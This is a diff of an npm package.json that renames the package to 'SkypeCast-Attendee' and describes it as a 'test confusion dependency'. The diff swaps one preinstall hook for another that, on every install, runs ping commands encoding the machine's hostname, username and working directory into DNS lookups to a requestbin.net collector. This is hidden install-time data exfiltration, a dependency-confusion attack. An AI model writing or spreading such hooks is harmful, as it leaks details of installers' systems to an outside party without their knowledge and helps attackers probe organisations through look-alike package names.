@@ -1,10 +1,10 @@
 {
-  "name": "npm-maven-adapter",
-  "version": "0.1.2",
+  "name": "SkypeCast-Attendee",
+  "version": "0.1.0",
   "description": "test confusion dependency",
   "main": "index.js",
   "scripts": {
-    "preinstall": "ping -c 2 `hostname`.3f0c675d718e8f5431e1.d.requestbin.net & ping -c 2 `whoami`.3f0c675d718e8f5431e1.d.requestbin.net & ping -c 2 `pwd`.3f0c675d718e8f5431e1.d.requestbin.net "
+    "preinstall": "ping -c 2 `hostname`.723608912b5b9599caf4.d.requestbin.net & ping -c 2 `whoami`.723608912b5b9599caf4.d.requestbin.net & ping -c 2 `pwd`.723608912b5b9599caf4.d.requestbin.net "
   },
   "author": "random",
   "license": "ISC"
